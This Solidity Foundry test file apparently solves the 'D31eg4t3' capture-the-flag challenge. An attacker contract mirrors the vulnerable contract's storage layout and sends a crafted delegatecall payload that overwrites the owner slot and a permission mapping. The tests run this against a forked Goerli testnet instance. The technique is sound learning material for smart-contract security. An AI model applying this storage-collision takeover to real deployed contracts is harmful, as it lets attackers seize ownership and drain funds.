// SPDX-License-Identifier: None
pragma solidity 0.8.7;

import { Test } from "forge-std/Test.sol";
import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import { D31eg4t3 } from "../src/Delegate.sol";

/**
 * @title   Answer to the D31eg4t3 Challenge
 * @notice  The vulnerable contract delegatecalls to this contract, we just reproduce the storage
 *          layout and change the stored value accordingly
 * @dev     Owner is slot 5, slots before are irrelevant (and not packed)
 * @author  DrGorilla.eth
 */
contract AttackContract {
    uint256 slot0;
    uint256 slot1;
    uint256 slot2;
    uint256 slot3;
    uint256 slot4;
    
    // First state variable to change
    address owner;

    // Second
    mapping(address=>bool) theOtherOneToChange;

    constructor() payable{}

    function attack(D31eg4t3 _target) external {
        // Craft the delegatecall payload as the function signature changing the variables
        (bool success, ) = _target.hackMe(abi.encodeWithSignature("pwned(address)", msg.sender));
        require(success, "!suc");
    }

    /**
     *  @dev This function is called by the delegatecall, it's context and storage is therefore the one of the
     *       vulnerable contract, we just need to update the variables as we want.
     */
    function pwned(address _newOwner) external {
        owner = _newOwner;
        theOtherOneToChange[_newOwner] = true;
    }
}

contract D31eg4t3Test is Test {
    D31eg4t3 _contract;

    function setUp() public {
        // Fork Goerli, to use the correct instance
        vm.createSelectFork('https://rpc.ankr.com/eth_goerli');
        _contract = D31eg4t3(0x971e55F02367DcDd1535A7faeD0a500B64f2742d);
    }

    function testDelegateCall_shouldSetNewOwner() public {
        AttackContract _attacker = new AttackContract();
        _attacker.attack(_contract);

        assertEq(_contract.owner(), address(this));
    }

    function testDelegateCall_shouldSetCanYouHackMe() public {
        AttackContract _attacker = new AttackContract();
        _attacker.attack(_contract);

        assertTrue(_contract.canYouHackMe(address(this)));
    }
}